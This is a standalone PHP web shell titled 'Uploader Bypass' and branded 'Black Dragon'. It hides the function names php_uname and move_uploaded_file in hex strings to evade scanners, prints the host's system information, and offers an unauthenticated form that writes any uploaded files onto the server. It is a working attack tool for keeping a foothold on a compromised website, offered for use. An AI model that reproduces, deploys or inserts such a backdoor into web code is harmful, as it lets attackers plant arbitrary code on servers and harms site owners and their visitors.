<?php

    /**
        * Uploader Bypass
    **/

$main = [
    "55706C6F61646572",
    "426C61636B20447261676F6E",
    "7068705F756E616D65",
    "6D6F76655F75706C6F616465645F66696C65"
];

for ($i = 0; $i < count($main); $i++) {
    $bd[$i] = uh($main[$i]);
}

function uh($hex){
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2){
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}
?>
<html>
    <head>
        <meta charset="utf-8">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
        <title><?= $bd[0] ?></title>
        <style>
            h1{
                font-family: Lobster;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <br><br><br><br><br>
            <table width="100%">
                <td>
                    <center>
                        <h1><?= $bd[1] ?></h1>
                        <?= $bd[2]() ?>
                    </center>
                    <br>
                    <div class="d-flex justify-content-center align-items-center">
                        <form method="post" enctype="multipart/form-data">
                            <div class="row">
                                <div class="col-md-9 mb-3">
                                    <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple aria-label="Upload">
                                </div>
                                <div class="col-md-3">
                                    <button type="submit" class="btn btn-primary btn-sm">Submit</button>
                                </div>
                            </div>
                        </form>
                    </div>
                    <?php
                        if (isset($_FILES['uploadfile'])) {
                            $total = count($_FILES['uploadfile']['name']);
                            for ($i = 0; $i < $total; $i++) {
                                $mainupload = $bd[3]($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);
                            }
                            if ($total < 2) {
                                if ($mainupload) {
                                    echo("<center><div class='col-md-3'><div class='alert alert-success' role='alert'>Upload File Successfully!</div></div></center>");
                                } else {
                                    echo("<center><div class='col-md-3'><div class='alert alert-danger' role='alert'>Upload File Failed</div></div></center>");
                                }
                            }
                            else{
                                if ($mainupload) {
                                    echo("<center><div class='col-md-3'><div class='alert alert-success' role='alert'>Upload $i Files Successfully!</div></div></center>");
                                } else {
                                    echo("<center><div class='col-md-3'><div class='alert alert-danger' role='alert'>Upload File Failed</div></div></center>");
                                }
                            }
                        }
                    ?>
                </td>
            </table>
        </div>
    </body>
<html>
